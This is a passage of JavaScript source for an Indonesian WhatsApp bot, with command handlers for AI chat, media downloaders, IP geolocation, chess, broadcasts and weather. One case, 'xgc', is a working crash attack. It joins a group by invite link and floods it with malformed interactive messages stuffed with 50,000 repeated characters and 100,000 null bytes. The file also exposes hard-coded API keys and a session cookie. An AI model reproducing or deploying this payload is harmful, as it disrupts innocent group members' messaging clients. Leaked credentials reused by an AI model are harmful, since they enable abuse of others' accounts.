    const apiKey = 'AIzaSyB2mvsGVTZAU-h-GtCLzoLhjHEdvugx9uQ'; // Dapatkan apikey dari  https://aistudio.google.com/app/apikey
    const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${apiKey}`;
    //wm hann
    const body = {
        contents: [
            {
                parts: [
                    { text: prompt }
                ]
            }
        ]
    };
//wm hann
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(body)
        });

        const data = await response.json();

        if (response.ok) {
            return data; 
        } else {
            throw new Error(data.error.message || 'Request failed');
        }
    } catch (error) {
        console.error('Error:', error.message);
        return null;
    }
};
//wm hann
const prompt = `Nama kamu adalah Kurumi, kamu adalah assisten virtual yang di buat oleh developer bernama DichXploit, kamu adalah gadis yang sendikit manja, dan kamu selalu sopan dalam berinteraksi dengan orang lain dan gunakan bahaa indonesa untuk berinteraksi. jika ada orang yang mempertanyakan soal jam maka kamu harus menjawab sekarang jam nih wkwkw. `;
    const combinedPrompt = `${prompt} ${text}`;
//wm hann
    try {
        // Mengirim prompt ke API Gemini
        const response = await sendToGemini(combinedPrompt);
//wm hann
        if (response) {
//wm hann
            const candidates = response.candidates;
            let message = candidates && candidates.length > 0
                ? candidates[0].content.parts[0].text
                : 'Tidak ada respons yang diterima dari model.';
            //wm hann
            // Mengganti ** dengan * dan mengedit jawaban jika perlu
            messagee = message.replace(/\*\*/g, '*').replace(/#{2,}/g, '#');
        } else {
//wm hann
            ptz.sendMessage(
                m.chat,
                { text: 'Gagal mendapatkan respons dari Gemini.' },
                { quoted: m }
            );
        }
    } catch (error) {
        console.error(error);
//wm hann
        ptz.sendMessage(
            m.chat,
            { text: 'Terjadi kesalahan saat memproses permintaan Anda.' },
            { quoted: m }
        );
    }
//wm hann
    try {
//wm hann
        let res = await generateVoice(messagee)
await m.reply(messagee)
        if (res) await ptz.sendMessage(m.chat, {
        audio: res,
        mimetype: 'audio/mp4',
        ptt: true,
        waveform: [100, 0, 100, 0, 100, 0, 100]
    }, {
        quoted: m
    })
    } catch (e) {
        await m.reply(e)
    }
//wm hann
}
break
case 'spotifydl2': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
 if (!text) return m.reply('*link spotify nya mana?*')
  /*loading ()
    if (global.db.data.users[m.sender].limit < 1 && !isCreator) return reply('*🚩 Limit Habis...*') // respon limit habis
                db.data.users[m.sender].limit -= 10
m.reply('*🚩 10 Limit Dipakai...*')*/
        try{      
const spodl = await (await fetch(`https://api.apigratis.site/downloader/spotify?url=${text}`)).json();
const spoDl = spodl.result.preview
ptz.sendMessage(m.chat,{audio:{url:spoDl.audio},mimetype: 'audio/mpeg',
     contextInfo: {
externalAdReply: {
title: spoDl.title,
body: `Author ${spoDl.artist}`,
thumbnailUrl: spoDl.image, 
sourceUrl: spoDl.link,
mediaType: 1,
showAdAttribution: false,
renderLargerThumbnail: true
}}},{quoted:m})
        } catch (e) {
            console.log(e) 
            reply('Terjadi error: ' + e)
        }
}
     break
/*
*Mending turu
*Dengerin ni lagu aja
*/

case 'trackip':
{
if (!text) return m.reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
 return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
 - Image: ${info.flag?.img || 'N/A'}
 - Emoji: ${info.flag?.emoji || 'N/A'}
 - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
 - ASN: ${info.connection?.asn || 'N/A'}
 - Organization: ${info.connection?.org || 'N/A'}
 - ISP: ${info.connection?.isp || 'N/A'}
 - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
 - ID: ${info.timezone?.id || 'N/A'}
 - Abbreviation: ${info.timezone?.abbr || 'N/A'}
 - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
 - Offset: ${info.timezone?.offset || 'N/A'}
 - UTC: ${info.timezone?.utc || 'N/A'}
 - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
 
if (!res.success) throw new Error(`IP ${text} not found!`);
await ptz.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
m.reply(formatIPInfo(res)); 
} catch (e) { 
m.reply(`Error: Unable to retrieve data for IP ${text}`);
}
}
break
case "xgc":
  {
    if (!isCreator) return reply(mess.prem)
    if (!text) {
      return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    reply("please wait, " + command + " bug is in process..");
      
      async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    ptz.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
      
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await ptz.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      sendViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      reply("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*");
      ptz.groupLeave(groupTarget);
    } catch (error) {
      reply(util.format(error));
    }
  }
  break;
/*
*
*`Perlu di ingat Wajib`
*`Memakai Baileys Support Saluran`
*
*/
//TanakaSen
case 'upchtext':{
if (!text) return reply('```🚩 Masukan Text Yang Ingin Di Post Ke Saluran```')
ptz.sendMessage(`${global.idch}`, { text : `${text}`,
contextInfo: {
mentionedJid: [m.sender],
forwardingScore: 9999, 
isForwarded: true,//TanakaSen
forwardedNewsletterMessageInfo: {
newsletterJid: '120363310531380313@newsletter',
serverMessageId: 20,//TanakaSen
newsletterName: '❃ zarxio - Assistant'
},
externalAdReply: {
title: "zarxio - Wabot", 
body: `Hai ${pushname} ${ucapanWaktu}`,//TanakaSen
thumbnailUrl: /*"https://files.catbox.moe/vikf6c.jpg",*/ "https://files.catbox.moe/iugwtd.jpg",
sourceUrl: null,
mediaType: 1
}, }
}, {quoted: m})
}
break
//Fllow https://whatsapp.com/channel/0029VaW25g5F1YlKczMRmd1h
/*Credit : Lenwy Si Pemula
https://whatsapp.com/channel/0029VaGdzBSGZNCmoTgN2K0u*/

case 'surah': {
  if (!text) return reply("🔍 *Masukkan Nomor Surah*");
    reply(mess.wait)
  try {
    let gd = await fetchJson(`https://api-lenwy.vercel.app/surah?search=${text}`);
    
    if (gd && gd.hasil && gd.hasil.length > 0) {
      let result = `🔍 *Surah Ke : ${q}*`;
      
      gd.hasil.forEach((hasil, index) => {
        result += `\n\n*Ayat ${index + 1}*\n\n`;
        result += `*${hasil.arab}*\n\n`
        result += `*${hasil.latin}*\n\n`;
        result += `_${hasil.indo}_\n\n==============================`;
      });

      reply(result);
    } else {
      reply("🔍 *Tidak Ada Hasil Yang Valid*");
    }
  } catch (error) {
    return reply(mess.error);
  }
}
break;
/**
 * 
 * [ *CASE TIKTOKDOWN FULL DATA* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'tt2': {
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
  //jangan hapus wm, ini hann
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`
//jangan hapus wm, ini hann
    if (!text) return m.reply(input)
   //jangan hapus wm, ini hann 
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
    //jangan hapus wm, ini hann
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			//jangan hapus wm, ini hann
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			//jangan hapus wm, ini hannn
			let domain = 'https://www.tikwm.com/api/';
			//jangan hapus wm, ini hann
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			//jangan hapus wm, ini han
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
			  //jangan hapus wm, ini hann
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				//jangan hapus wm, ini hannn
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				//jangan hapus wm, ini hannn
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			//jangan hapus wm, ini han
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
//jangan hapus wm, ini hann
let down = await tiktokDl(text)
//jangan hapus wm, ini hann
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
${down.title}
${down.region}
${down.id}
${down.duration}
${down.size_nowm_hd}

Music Info:
${down.music_info.id}
${down.music_info.title}
${down.music_info.author}

Stats: 
${down.stats.views}
${down.stats.likes}
${down.stats.comment}
${down.stats.share}
${down.stats.download}

Author: 
${down.author.id}
${down.author.fullname}
${down.author.nickname}
${down.author.avatar}
`
//jangan hapus wm, ini hann
await ptz.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await ptz.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case 'chess':{
    let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
if (!m.isGroup) return m.reply('Khusus Grup')
const key = m.chat;
  ptz.chess = ptz.chess || {};
  let chessData = ptz.chess[key] || {
    gameData: null,
    fen: null,
    currentTurn: null,
    players: [],
    hasJoined: []
  };
  ptz.chess[key] = chessData;
  const { gameData, fen, currentTurn, players, hasJoined } = chessData;
  const feature = args[0]?.toLowerCase();

  if (feature === 'delete') {
    delete ptz.chess[key];
    return reply('🏳️ *Permainan catur dihentikan.*');
  }

  if (feature === 'create') {
    if (gameData) {
      return reply('⚠️ *Permainan sudah dimulai.*');
    }
    chessData.gameData = { status: 'waiting', black: null, white: null };
    return reply('🎮 *Permainan catur dimulai.*\nMenunggu pemain lain untuk bergabung.');
  }

  if (feature === 'join') {
    const senderId = m.sender;
    if (players.includes(senderId)) {
      return reply('🙅‍♂️ *Anda sudah bergabung dalam permainan ini.*');
    }
    if (!gameData || gameData.status !== 'waiting') {
      return reply('⚠️ *Tidak ada permainan catur yang sedang menunggu.*');
    }
    if (players.length >= 1) {
      return reply('👥 *Pemain sudah mencukupi.*\nPermainan otomatis dimulai.');
    }
    players.push(senderId);
    hasJoined.push(senderId);
    if (players.length === 2) {
      gameData.status = 'ready';
      const [black, white] = Math.random() < 0.5 ? [players[1], players[0]] : [players[0], players[1]];
      gameData.black = black;
      gameData.white = white;
      chessData.currentTurn = white;
      return ptz.sendMessage(m.chat, `🙌 *Pemain yang telah bergabung:*\n${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}\n\n*Hitam:* @${black.split('@')[0]}\n*Putih:* @${white.split('@')[0]}\n\nSilakan gunakan *'chess start'* untuk memulai permainan.`, m, { mentions: hasJoined });
    } else {
      return reply('🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.');
    }
  }

  if (feature === 'start') {
    if (gameData.status !== 'ready') {
      return reply('⚠️ *Tidak dapat memulai permainan. Tunggu hingga dua pemain bergabung.*');
    }
    gameData.status = 'playing';
    const senderId = m.sender;
    if (players.length === 2) {
      const fen = 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1';
      chessData.fen = fen;
      const encodedFen = encodeURIComponent(fen);
      const giliran = `🎲 *Giliran:* Putih @${gameData.white.split('@')[0]}`;
      const flipParam = senderId === gameData.black ? '' : '&flip=true';
      const flipParam2 = senderId === gameData.black ? '' : '-flip';
      const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;
      try {
        return ptz.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [gameData.white] });
      } catch (error) {
        const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
        return ptz.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [gameData.black] });
      }
      return;
    } else {
      return reply('🙋‍♂️ *Anda telah bergabung dalam permainan catur.*\nMenunggu pemain lain untuk bergabung.');
    }
  }

  if (args[0] && args[1]) {
    const senderId = m.sender;
    if (!gameData || gameData.status !== 'playing') {
      return reply('⚠️ *Permainan belum dimulai.*');
    }
    if (currentTurn !== senderId) {
      return ptz.sendMessage(m.chat, `⏳ *Sekarang giliran ${chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam'} untuk bergerak.*`, m, {
        contextInfo: {
          mentionedJid: [currentTurn]
        }
      });
    }
    const chess = new Chess(fen);
    if (chess.isCheckmate()) {
      delete ptz.chess[key];
      return ptz.sendMessage(m.chat, `⚠️ *Game Checkmate.*\n🏳️ *Permainan catur dihentikan.*\n*Pemenang:* @${m.sender.split('@')[0]}`, m, {
        contextInfo: {
          mentionedJid: [m.sender]
        }
      });
    }
    if (chess.isDraw()) {
      delete ptz.chess[key];
      return ptz.sendMessage(m.chat, `⚠️ *Game Draw.*\n🏳️ *Permainan catur dihentikan.*\n*Pemain:* ${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}`, m, {
        contextInfo: {
          mentionedJid: hasJoined
        }
      });
    }
    const [from, to] = args;
    try {
      chess.move({ from, to, promotion: 'q' });
    } catch (e) {
      return reply('❌ *Langkah tidak valid.*');
    }
    chessData.fen = chess.fen();
    const currentTurnIndex = players.indexOf(currentTurn);
    const nextTurnIndex = (currentTurnIndex + 1) % 2;
    chessData.currentTurn = players[nextTurnIndex];
    const encodedFen = encodeURIComponent(chess.fen());
    const currentColor = chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam';
    const giliran = `🎲 *Giliran:* ${currentColor} @${chessData.currentTurn.split('@')[0]}\n\n${chess.getComment() || ''}`;
    const flipParam = senderId === gameData.black ? '' : '&flip=true';
    const flipParam2 = senderId === gameData.black ? '' : '-flip';
    const boardUrl = `https://www.chess.com/dynboard?fen=${encodedFen}&board=graffiti&piece=graffiti&size=3&coordinates=inside${flipParam}`;
    try {
      return ptz.sendFile(m.chat, boardUrl, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    } catch (error) {
      const boardUrl2 = `https://chessboardimage.com/${encodedFen + flipParam2}.png`;
      return ptz.sendFile(m.chat, boardUrl2, '', giliran, m, false, { mentions: [chessData.currentTurn] });
    }
    chess.deleteComment();
    return;
  }

  if (feature === 'help') {
    return reply(`
      🌟 *Perintah Permainan Catur:*

*chess create* - Mulai permainan catur
*chess join* - Bergabung dalam permainan catur yang sedang menunggu
*chess start* - Memulai permainan catur jika ada dua pemain yang sudah bergabung
*chess delete* - Menghentikan permainan catur
*chess [dari] [ke]* - Melakukan langkah dalam permainan catur

*Contoh:*
Ketik *chess create* untuk memulai permainan catur.
Ketik *chess join* untuk bergabung dalam permainan catur yang sedang menunggu.
    `);
  }
  return reply('❓ Perintah tidak valid. Gunakan *"chess help"* untuk melihat bantuan.');
};
break;
//*[ SUIT VS BOT ]*

case "suit": {
if (!m.isGroup) return reply(mess.group)
let user = global.db.data.users[m.sender]
if (user.registered === false) return reply(mess.notregist);
let salah = `Example: ${prefix+command} gunting\n\n*Pilihan yang tersedia :*\nBatu, Gunting, Kertas`
if (!text) return reply(salah)
var astro = Math.random()
if (astro < 0.34) {
astro = "batu"
} else if (astro > 0.34 && astro < 0.67) {
astro = "gunting"
} else {
astro = "kertas"
}
if (text == astro) {
reply(`*── 「 SUIT 」 ──*\n\n*Seri!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else if (text == "batu") {
if (astro == "gunting") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else if (text == "gunting") {
if (astro == "kertas") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else if (text == "kertas") {
if (astro == "batu") {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu menang!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
} else {
reply(`*── 「 SUIT 」 ──*\n\n*Kamu kalah!*\n\n🤖 ${botname} : ${astro}\n👤 ${pushname} : ${text}`)
}
} else {
return reply(salah)
}
}
break
case 'undang': case 'invite': {
	if (!m.isGroup) return reply('Cmd Khusus Group')
	if (!isBotAdmins) return reply('Bot Harus Menjadi Admin Terlebih Dahulu Hhe')
if (!text) return reply(`Masukkan Nomer yang Ingin Anda Invite\n\nContoh :\n*${prefix + command}* 628xxxxx`)
if (text.includes('+')) return reply(`Bubub`)
if (isNaN(text)) return reply(`Yang Bener Ganteng`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await ptz.groupInviteCode(group)
      await ptz.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nMasuk Sini Ganteng\n\n${link}`, mentions: [m.sender]})
        reply(`Dahh`) 
}
break
case 'bcgcb': case 'gcast': case 'broadcastv2': {
if (!isPrem) return m.reply('Only Owner')
if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Apa Kabar You Semua`)
let getGroups = await ptz.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(7000)
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: idch,
 newsletterName: `Broadcast ${botname}!`, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: text
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ''
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: '',
 subtitle: `< Share Case & Script >`,
 hasMediaAttachment: false,
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Website\",\"url\":\"https://whatsapp.com/channel/0029VaclEQBGehEMNAfSU61j\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaclEQBGehEMNAfSU61j\"}`
 },
 {
 "name": "cta_url",
 "buttonParamsJson": `{\"display_text\":\"Saluran\",\"url\":\"https://whatsapp.com/channel/0029VaclEQBGehEMNAfSU61j\",\"merchant_url\":\"https://whatsapp.com/channel/0029VaclEQBGehEMNAfSU61j\"}`
 },
 ]
 })
 })
 }
 }
}, {})

await ptz.relayMessage(i, msg.message, {
 messageId: msg.key.id
})
}
   /* let m2 = '`'
async function reply(txt) {
const RiooAjahhh = {      
contextInfo: {
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterName: `🔴 ${hariini} || ${botname} ʙʏ ᴅɪᴄʜxᴘʟᴏɪᴛ${m2}`,
newsletterJid: "120363310531380313@newsletter",
},
externalAdReply: {  
showAdAttribution: true,
title: botname,
body: hariini,
thumbnailUrl: 'https://telegra.ph/file/cd7a6e114b09df25c6159.jpg',
sourceUrl: saluran,
},
},
text: txt,
}
return ptz.sendMessage(i, RiooAjahhh, {
quoted: m,
})
    }
    }*/
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break
case 'bcgc':
            case 'bcgroup': {
                if (!isPrem) return reply(mess.owner)
                if (!text) return reply(`Text mana?\n\nExample : ${prefix + command} testing `)
                let getGroups = await ptz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                reply(`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${botname}'s Broadcast💬\n\n` + '```' + `Message: ${text}\n\nBergabung Untuk Menerima Info Bot🕊️` + '```'
                    ptz.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://f.uguu.se/NOLkEHkP.jpg',
                                sourceUrl: saluran,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                reply(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
case 'restart':
if (!isCreator) return reply('Only Owner')
reply('Restarting Bot . . .')
await sleep(2000)
process.exit()
break
case 'leave':
 case 'out':
 if (!isCreator) return reply(mess.owner)
 if (!m.isGroup) return reply('khusus group')
 reply('Bye Everyone 🥺')
 await ptz.groupLeave(m.chat)
 break
case 'join': {
if (!isPrem) return reply(mess.owner);
if (!text) return m.reply('Masukkan Link Grup!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Tautan Tidak Valid!')

let result = args[0].split('https://chat.whatsapp.com/')[1];
await ptz.groupAcceptInvite(result)
  .then((res) => m.reply(jsonformat(res)))
  .catch((err) => m.reply(jsonformat(err)));
  }
break
case 'tqto': 
 case 'thanksto': 
 
 ptz.relayMessage(m.chat, {
 "requestPaymentMessage": {
 amount: {
 value: 2022000,
 offset: 0,
 currencyCode: 'IDR'
 },
 amount1000: 999999999,
 background: null,
 currencyCodeIso4217: 'USD',
 expiryTimestamp: 0,
 noteMessage: {
 extendedTextMessage: {
 text: 
 
 `
⊱━━━ THANKS TO ━━━⊰

• Dich (developer bot/kang copas)
• siputzz (penyedia base)
• Xeon (support)
• DitzzXploit (support)
• kizh (support)
• Adrian (support)
• all member (yang udh bantu fix SC/fitur bot)
• dan terima kasih sudah menggunakan sc ini
 
 Terima Kasih Pada Yang Sudah Membantu Membuat Bot😗
 
 ┗━━━━ ${global.botname} ━━━┛
 `
 }
 },
 requestFrom: m.sender
 }
 }, {})
break
case 'cuaca': case 'weather': {
				if (!text) return reply(`Example: ${prefix + command} jakarta`)
				try {
					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
					reply(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
				} catch (e) {
					reply('Kota Tidak Di Temukan!')
				}
			}
			break
case 'aio2': {
  if (!text) return reply(`Example: ${prefix + command} link tt lu`)
async function aio(url){
	return new Promise(async(resolve,reject) => {
		
 const { data: rest } = await axios.get("https://steptodown.com/")
    const $ = cheerio.load(rest) 
    const tokens = $("input[name='token']").val()
    const data = new URLSearchParams(
      Object.entries({
        url: url,
        token: tokens 
      })
    )    
    await axios.post("https://steptodown.com/wp-json/aio-dl/video-data/", data, {
      headers: {
        "cookie": "PHPSESSID=658754a80bacc095aced0be8e110f3b4; pll_language=en",
        "user-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
      }
    })
    .then(( response ) => {
      resolve(response.data)
    })
    .catch((e) => {
      reject(e)
    })
  })
}
let sonice = await aio(text)
let wpol = `[ *AIO DOWNLOADER* ]

${sonice.title}

Durasi: ${sonice.duration}
Source: ${sonice.source}
Size: ${sonice.medias[0].formattedSize} || ${sonice.medias[0].size}
Quality: ${sonice.medias[0].quality}
MimeType: ${sonice.medias[0].extension}
`
await ptz.sendMessage(m.chat, { video: { url: sonice.medias[0].url }, caption: wpol }, { quoted: m })
}
break
case 'yayaya':
if (!text) return reply('reply ngap');
let q = m.quoted ? m.quoted : m
const fileTypeFromBuffer = require("file-type")
const { FormData, Blob } = require("formdata-node")

async function formatBytes(bytes) {
  if (bytes === 0) {
    return "0 B";
  }
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(1024));
  return `${(bytes / 1024 ** i).toFixed(2)} ${sizes[i]}`;
}

async function catboxx(content) {
  const { ext, mime } = (await fileTypeFromBuffer(content)) || {};
  const blob = new Blob([content.toArrayBuffer()], { type: mime });
  const formData = new FormData();
  const randomBytes = crypto.randomBytes(5).toString("hex");
  formData.append("reqtype", "fileupload");
  formData.append("fileToUpload", blob, randomBytes + "." + ext);

  const response = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: formData,
    headers: {
      "User-Agent":
